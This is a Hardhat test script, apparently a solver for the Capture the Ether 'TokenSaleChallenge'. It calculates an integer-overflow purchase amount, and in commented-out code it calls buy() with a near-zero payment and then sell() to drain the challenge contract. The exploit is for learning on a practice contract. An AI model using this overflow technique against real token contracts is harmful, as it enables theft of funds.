import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";

let accounts: Signer[];
let eoa: Signer;
let challengeContract: Contract;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const challengeFactory = await ethers.getContractFactory(
    "TokenSaleChallenge"
  );
  challengeContract = challengeFactory.attach(
    `0xe8A4E7F02498432a41D60DBdB65394286e2003B1`
  );
});

it("solves the challenge", async function () {

  // decimals not accepted in bn.js library... so we should find a workaround
  // const decimalValue = BigNumber.from(10.10)
  // console.log("decimalValue : " + decimalValue)
  

  const twoPow256 = BigNumber.from(`2`).pow(`256`)
  const ONE_ETHER = BigNumber.from(`10`).pow(`18`)

  const beforeModn0 = twoPow256.add(ONE_ETHER).div(ONE_ETHER).mul(ONE_ETHER)
  const beforeModn1 = twoPow256.add(ONE_ETHER).sub(BigNumber.from(`415992086870360064`)).div(ONE_ETHER).mul(ONE_ETHER)
  const beforeModn2 = twoPow256.add(ONE_ETHER.mul(2)).div(ONE_ETHER).mul(ONE_ETHER)

  console.log("before mod : " + beforeModn1)

  const afterModn0 = beforeModn0.mod(twoPow256)
  const afterModn1 = beforeModn1.mod(twoPow256)
  const afterModn2 = beforeModn2.mod(twoPow256)

  console.log("after mod : " + afterModn0)
  console.log("after mod : " + afterModn1)
  console.log("after mod : " + afterModn2)

  

  // const toBuy = twoPow256.add(ONE_ETHER).div(ONE_ETHER)

  // const overflowValue = BigNumber.from(`2`).pow(`256`)  
  // console.log("over : " + overflowValue)
  // console.log("over : " + overflowValue.add(100))
  // console.log("over : " + overflowValue.add(200))
  // console.log("over : " + overflowValue)
  // console.log("over : " + overflowValue)


  
  // const exactValue = BigNumber.from(`2`).pow(`256`).div(ONE_ETHER)
  // const absValue = BigNumber.from(`2`).pow(`256`).div(ONE_ETHER).abs()
  
  // console.log("diff : " + overflowValue.sub(exactValue))

  // console.log("part : " + overflowValue.div(ONE_ETHER).mul(ONE_ETHER))

  // console.log("tota : " + overflowValue.div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
  // console.log("tota : " + overflowValue.add(100).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
  // console.log("tota : " + overflowValue.add(200).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
  // console.log("tota : " + overflowValue.add(300).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
  // console.log("tota : " + overflowValue.add(400).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
  // console.log("tota : " + overflowValue.add(500).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
  // console.log("tota : " + overflowValue.add(50000).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))


// BigNumber.prototype.
  // console.log("exact : " + exactValue.)
  // console.log("exact : " + exactValue)
  // console.log("abs : " + absValue)

  // const calcDiv = exactValue.div(ONE_ETHER)
  // console.log("calc div :" + calcDiv)


  // const calcMod = calcDiv.mod(overflowValue)

  // console.log("mod : " + calcMod)
  //   await challengeContract.buy(bestPair.toBuy.toString(), {
  //   value: bestPair.toPay.toString(),
  // });
  // // we want an overflow in this line of the contract:
  // // uint256 = numTokens * 1 ether = numTokens * 10 ^ 18
  // // when x is the amount of tokens we will receive (input to buy)
  // // then we need to pay ceil(x / 10^18) * 10^18 mod 2^256 (overflow amount) in value
  // // try to minimize this payment value for x >= 2^256 (when overflow happens)
  // // not sure how to do it analytically, but we can just start with x = 2^256
  // // as 2^256 and 10^18 = (2*5)^18 = 2^18*5^18, multiplying by prime 3 should
  // // give us a good cycle to check for min value
  // const ONE_ETHER = BigNumber.from(`10`).pow(`18`);
  // const computePayment = (x: BigNumber) => {
  //   // there's a remainder that is cut off, need to increase division result by 1
  //   let toBuy = x.div(ONE_ETHER).add(`1`);
  //   let overflowRemainder = toBuy
  //     .mul(ONE_ETHER)
  //     .mod(BigNumber.from(`2`).pow(`256`));
  //   return { toBuy, toPay: overflowRemainder };
  // };
  // let MAX_UINT256 = BigNumber.from(`2`).pow(`256`);
  // let multiplier = BigNumber.from(`3`)
  // let bestPair: ReturnType<typeof computePayment> = {
  //   toBuy: BigNumber.from(`0`),
  //   toPay: BigNumber.from(ethers.utils.parseEther(`1`)),
  // };

  // // make sure toBuy = x / ONE_ETHER
  // while(true) {
  //   multiplier = multiplier.mul(`3`);
  //   const result = computePayment(MAX_UINT256.mul(multiplier))

  //   // make sure to buy still fits in uint256 for function call
  //   if(result.toBuy.gte(MAX_UINT256)) break;

  //   if(result.toPay.lt(bestPair.toPay)) {
  //     bestPair = result
  //   }
  // }

  // console.log(`buying`, bestPair.toBuy.toString());
  // console.log(`paying`, ethers.utils.formatEther(bestPair.toPay), `ETH`);

  // await challengeContract.buy(bestPair.toBuy.toString(), {
  //   value: bestPair.toPay.toString(),
  // });

  // const balance: BigNumber = await challengeContract.balanceOf(await eoa.getAddress());
  // console.log(`balance`, balance.toString());

  // const tx = await challengeContract.sell(`1`);

  // const isComplete = await challengeContract.isComplete();
  // expect(isComplete).to.be.true;
});
